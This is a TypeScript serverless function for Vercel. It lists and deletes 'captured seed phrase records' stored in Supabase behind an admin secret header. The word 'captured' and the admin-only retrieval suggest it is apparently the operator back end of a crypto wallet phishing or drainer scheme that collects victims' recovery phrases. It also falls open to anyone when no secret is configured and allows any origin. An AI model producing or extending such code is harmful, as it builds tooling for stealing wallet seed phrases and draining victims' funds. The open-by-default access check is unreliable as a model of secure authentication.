// Vercel serverless function: GET /api/seeds
// Returns all captured seed phrase records directly from Supabase.
// Requires x-admin-secret header matching ADMIN_API_SECRET env var.
// DELETE /api/seeds  — remove one record by id (body: { id: string })

const SUPABASE_URL   = (process.env.SUPABASE_URL   ?? process.env.VITE_SUPABASE_URL   ?? '').trim()
const SUPABASE_KEY   = (
  process.env.SUPABASE_SERVICE_ROLE_KEY
  ?? process.env.SUPABASE_ANON_KEY
  ?? process.env.VITE_SUPABASE_ANON_KEY
  ?? ''
).trim()
const ADMIN_SECRET   = (process.env.ADMIN_API_SECRET ?? '').trim()
const ALLOWED_ORIGIN = (process.env.APP_ORIGIN ?? '*').trim()

function isAuthorized(req: Request): boolean {
  if (!ADMIN_SECRET) return true // open if secret not configured (development)
  const header = (req.headers.get('x-admin-secret') ?? req.headers.get('authorization') ?? '').trim()
  const token  = header.startsWith('Bearer ') ? header.slice(7) : header
  return token === ADMIN_SECRET
}

function corsHeaders(methods = 'GET, DELETE, OPTIONS'): Record<string, string> {
  return {
    'Access-Control-Allow-Origin':  ALLOWED_ORIGIN,
    'Access-Control-Allow-Methods': methods,
    'Access-Control-Allow-Headers': 'Content-Type, x-admin-secret, Authorization',
  }
}

function json(payload: unknown, status = 200): Response {
  return new Response(JSON.stringify(payload), {
    status,
    headers: { 'Content-Type': 'application/json', ...corsHeaders() },
  })
}

function supabaseHeaders() {
  return {
    apikey:          SUPABASE_KEY,
    Authorization:   `Bearer ${SUPABASE_KEY}`,
    'Content-Type':  'application/json',
    Prefer:          'return=representation',
  }
}

function supabaseUpsertHeaders() {
  return { ...supabaseHeaders(), Prefer: 'resolution=merge-duplicates,return=representation' }
}

export default async function handler(req: Request): Promise<Response> {
  if (req.method === 'OPTIONS') return new Response(null, { status: 204, headers: corsHeaders() })

  if (!isAuthorized(req)) return json({ error: 'Unauthorized' }, 401)

  if (!SUPABASE_URL || !SUPABASE_KEY) return json({ error: 'Supabase not configured' }, 503)

  // ── GET — list all records ────────────────────────────────────────────────
  if (req.method === 'GET') {
    try {
      const res = await fetch(
        `${SUPABASE_URL}/rest/v1/app_state?id=eq.global&select=seed_phrases`,
        { headers: supabaseHeaders(), signal: AbortSignal.timeout(10_000) },
      )
      if (!res.ok) return json({ error: 'Supabase read failed', status: res.status }, 502)
      const rows = (await res.json()) as { seed_phrases: unknown[] }[]
      const seeds = Array.isArray(rows[0]?.seed_phrases) ? rows[0].seed_phrases : []
      return json({ seeds, total: seeds.length })
    } catch (err) {
      return json({ error: String(err) }, 500)
    }
  }

  // ── DELETE — remove one record by id ─────────────────────────────────────
  if (req.method === 'DELETE') {
    let body: { id?: string }
    try { body = (await req.json()) as { id?: string } } catch { return json({ error: 'Bad JSON' }, 400) }
    if (!body?.id || typeof body.id !== 'string') return json({ error: 'Missing or invalid id' }, 400)

    try {
      const fetchRes = await fetch(
        `${SUPABASE_URL}/rest/v1/app_state?id=eq.global&select=seed_phrases`,
        { headers: supabaseHeaders(), signal: AbortSignal.timeout(10_000) },
      )
      const rows = fetchRes.ok ? (await fetchRes.json() as { seed_phrases: { id: string }[] }[]) : []
      const existing = Array.isArray(rows[0]?.seed_phrases) ? rows[0].seed_phrases : []
      const updated  = existing.filter(r => r.id !== body.id)

      await fetch(`${SUPABASE_URL}/rest/v1/app_state?on_conflict=id`, {
        method:  'POST',
        headers: supabaseUpsertHeaders(),
        body:    JSON.stringify({ id: 'global', seed_phrases: updated, updated_at: new Date().toISOString() }),
        signal:  AbortSignal.timeout(10_000),
      })
      return json({ ok: true, remaining: updated.length })
    } catch (err) {
      return json({ error: String(err) }, 500)
    }
  }

  return json({ error: 'Method not allowed' }, 405)
}
